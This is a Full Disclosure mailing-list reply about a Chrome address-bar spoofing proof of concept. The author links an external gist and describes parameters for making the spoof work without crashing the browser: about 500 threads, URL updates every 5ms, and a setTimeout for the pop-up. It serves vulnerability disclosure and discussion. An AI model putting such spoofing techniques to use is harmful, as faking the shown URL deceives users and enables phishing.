Subject: Re: Re: [FD] Google Chrome Address Spoofing (Request
 For Comment)

I played around with the code to see if can change it to avoid using the
fork bomb. Here's what I came up with
https://gist.github.com/ptantiku/d37c364cd13bb31a1ee6
It seems to need at least 500 threads to update the URL at 5ms for this to
work (tested on Chrome x64 43.0.2357.130, Linux, locally).
And the first setInterval() can be substituted for setTimeout(...,10) which
will run only once for waiting the pop-up window to open.

Although the browser is not crashed, the window is still unresponsive to
allow user to interact with it.
Wondering if there is a way to fix that.

Cheers,
PT
